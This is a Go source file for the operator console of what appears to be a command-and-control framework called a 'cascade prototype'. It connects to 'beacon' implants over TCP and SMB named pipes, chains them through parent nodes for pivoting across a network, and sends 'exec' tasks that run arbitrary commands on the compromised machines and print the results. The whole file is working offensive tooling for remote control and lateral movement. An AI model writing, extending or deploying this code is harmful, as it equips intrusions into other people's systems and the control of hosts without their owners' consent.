package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"sort"
	"strings"
	"sync"
)

type Root struct {
	mu      sync.RWMutex
	links   map[string]*Link
	parent  map[string]string
	taskSeq uint32
}

func NewRoot() *Root {
	return &Root{
		links:  make(map[string]*Link),
		parent: make(map[string]string),
	}
}

func (r *Root) Run() error {
	fmt.Println("[root] cascade prototype root")
	r.printHelp()

	scanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Print("cascade> ")
		if !scanner.Scan() {
			return scanner.Err()
		}
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}
		if !r.handleLine(line) {
			return nil
		}
	}
}

func (r *Root) handleLine(line string) bool {
	fields := strings.Fields(line)
	if len(fields) == 0 {
		return true
	}

	switch fields[0] {
	case "help", "?":
		r.printHelp()
	case "exit", "quit":
		return false
	case "nodes":
		r.printNodes()
	case "connect-tcp":
		if len(fields) != 3 {
			fmt.Println("usage: connect-tcp <child_id> <host:port>")
			break
		}
		r.connectTCP(fields[1], fields[2])
	case "connect-smb":
		if len(fields) != 3 {
			fmt.Println(`usage: connect-smb <child_id> \\.\pipe\name`)
			break
		}
		r.connectSMB(fields[1], fields[2])
	case "connect-tcp-via":
		if len(fields) != 4 {
			fmt.Println("usage: connect-tcp-via <parent_id> <child_id> <host:port>")
			break
		}
		r.sendTo(fields[1], Message{
			Cmd:    CmdConnectTCP,
			TaskID: r.nextTaskID(),
			Src:    "root",
			Child:  fields[2],
			Body:   []byte(fields[3]),
		})
	case "connect-smb-via":
		if len(fields) != 4 {
			fmt.Println(`usage: connect-smb-via <parent_id> <child_id> \\.\pipe\name`)
			break
		}
		r.sendTo(fields[1], Message{
			Cmd:    CmdLinkSMB,
			TaskID: r.nextTaskID(),
			Src:    "root",
			Child:  fields[2],
			Body:   []byte(fields[3]),
		})
	case "exec":
		if len(fields) < 3 {
			fmt.Println("usage: exec <beacon_id> <command...>")
			break
		}
		r.sendTo(fields[1], Message{
			Cmd:    CmdExec,
			TaskID: r.nextTaskID(),
			Src:    "root",
			Body:   []byte(strings.Join(fields[2:], " ")),
		})
	case "ping":
		if len(fields) != 2 {
			fmt.Println("usage: ping <beacon_id>")
			break
		}
		r.sendTo(fields[1], Message{
			Cmd:    CmdPing,
			TaskID: r.nextTaskID(),
			Src:    "root",
			Body:   []byte("ping"),
		})
	default:
		fmt.Println("unknown command:", fields[0])
	}
	return true
}

func (r *Root) printHelp() {
	fmt.Println("commands:")
	fmt.Println("  connect-tcp <child_id> <host:port>")
	fmt.Println(`  connect-smb <child_id> \\.\pipe\name`)
	fmt.Println("  connect-tcp-via <parent_id> <child_id> <host:port>")
	fmt.Println(`  connect-smb-via <parent_id> <child_id> \\.\pipe\name`)
	fmt.Println("  exec <beacon_id> <command...>")
	fmt.Println("  ping <beacon_id>")
	fmt.Println("  nodes")
	fmt.Println("  exit")
}

func (r *Root) connectTCP(childID string, addr string) {
	conn, err := dialTCP(addr)
	if err != nil {
		fmt.Printf("[root] connect tcp failed: %v\n", err)
		return
	}
	r.registerDirectChild(childID, "tcp", addr, conn)
}

func (r *Root) connectSMB(childID string, pipe string) {
	conn, err := dialPipe(pipe)
	if err != nil {
		fmt.Printf("[root] connect smb failed: %v\n", err)
		return
	}
	r.registerDirectChild(childID, "smb", pipe, conn)
}

func (r *Root) registerDirectChild(expectedID string, kind string, endpoint string, conn net.Conn) {
	msg, _, err := readFrame(conn)
	if err != nil {
		fmt.Printf("[root] read hello failed: %v\n", err)
		_ = conn.Close()
		return
	}
	if msg.Cmd != CmdHello {
		fmt.Printf("[root] expected HELLO, got %s\n", cmdName(msg.Cmd))
		_ = conn.Close()
		return
	}

	childID := msg.Src
	if childID == "" {
		childID = expectedID
	}
	link := &Link{ID: childID, Kind: kind, Endpoint: endpoint, Conn: conn}

	r.mu.Lock()
	if old := r.links[childID]; old != nil {
		old.Close()
	}
	r.links[childID] = link
	r.parent[childID] = "root"
	r.mu.Unlock()

	fmt.Printf("[root] direct child online id=%s kind=%s endpoint=%s hello=%s\n",
		childID, kind, endpoint, string(msg.Body))
	go r.readDirectChild(link)
}

func (r *Root) readDirectChild(link *Link) {
	for {
		msg, _, err := readFrame(link.Conn)
		if err != nil {
			fmt.Printf("[root] child %s closed: %v\n", link.ID, err)
			r.mu.Lock()
			delete(r.links, link.ID)
			r.mu.Unlock()
			return
		}
		r.handleEnvelope(link.ID, msg)
	}
}

func (r *Root) handleEnvelope(origin string, msg Message) {
	fmt.Printf("[root] <- origin=%s %s child=%s len=%d\n", origin, cmdName(msg.Cmd), msg.Child, len(msg.Body))

	switch msg.Cmd {
	case CmdOpen:
		r.mu.Lock()
		r.parent[msg.Child] = origin
		r.mu.Unlock()
		fmt.Printf("[root] node online id=%s parent=%s info=%s\n", msg.Child, origin, string(msg.Body))
	case CmdRead:
		inner, err := decodeMessage(msg.Body)
		if err != nil {
			fmt.Printf("[root] decode read from %s failed: %v\n", msg.Child, err)
			return
		}
		r.handleEnvelope(msg.Child, inner)
	case CmdResult:
		fmt.Printf("[result:%s task=%d]\n%s\n", origin, msg.TaskID, string(msg.Body))
	case CmdDead:
		fmt.Printf("[root] node dead id=%s parent=%s reason=%s\n", msg.Child, origin, string(msg.Body))
	case CmdPing:
		fmt.Printf("[root] ping reply from %s: %s\n", origin, string(msg.Body))
	default:
		fmt.Printf("[root] unhandled message from %s: %s\n", origin, cmdName(msg.Cmd))
	}
}

func (r *Root) sendTo(targetID string, msg Message) {
	raw, firstHop, err := r.buildRoute(targetID, msg)
	if err != nil {
		fmt.Printf("[root] route failed: %v\n", err)
		return
	}

	r.mu.RLock()
	link := r.links[firstHop]
	r.mu.RUnlock()
	if link == nil {
		fmt.Printf("[root] first hop %s is not connected\n", firstHop)
		return
	}
	if err := link.WriteRaw(raw); err != nil {
		fmt.Printf("[root] write to %s failed: %v\n", firstHop, err)
	}
}

func (r *Root) buildRoute(targetID string, msg Message) ([]byte, string, error) {
	path, err := r.pathFromRoot(targetID)
	if err != nil {
		return nil, "", err
	}

	raw, err := encodeMessage(msg)
	if err != nil {
		return nil, "", err
	}

	for i := len(path) - 2; i >= 0; i-- {
		wrapper := Message{
			Cmd:    CmdRoute,
			TaskID: msg.TaskID,
			Src:    "root",
			Child:  path[i+1],
			Body:   raw,
		}
		raw, err = encodeMessage(wrapper)
		if err != nil {
			return nil, "", err
		}
	}
	return raw, path[0], nil
}

func (r *Root) pathFromRoot(targetID string) ([]string, error) {
	r.mu.RLock()
	defer r.mu.RUnlock()

	if _, ok := r.parent[targetID]; !ok {
		return nil, fmt.Errorf("unknown node: %s", targetID)
	}

	var rev []string
	cur := targetID
	for cur != "" && cur != "root" {
		rev = append(rev, cur)
		p, ok := r.parent[cur]
		if !ok {
			return nil, fmt.Errorf("broken parent chain at %s", cur)
		}
		cur = p
	}
	if len(rev) == 0 {
		return nil, fmt.Errorf("empty path")
	}

	path := make([]string, len(rev))
	for i := range rev {
		path[i] = rev[len(rev)-1-i]
	}
	return path, nil
}

func (r *Root) printNodes() {
	r.mu.RLock()
	defer r.mu.RUnlock()

	var ids []string
	for id := range r.parent {
		ids = append(ids, id)
	}
	sort.Strings(ids)
	if len(ids) == 0 {
		fmt.Println("[root] no nodes")
		return
	}
	for _, id := range ids {
		p := r.parent[id]
		linkState := "routed"
		if l := r.links[id]; l != nil {
			linkState = fmt.Sprintf("direct kind=%s endpoint=%s", l.Kind, l.Endpoint)
		}
		fmt.Printf("  %s parent=%s %s\n", id, p, linkState)
	}
}

func (r *Root) nextTaskID() uint32 {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.taskSeq++
	if r.taskSeq == 0 {
		r.taskSeq = 1
	}
	return r.taskSeq
}
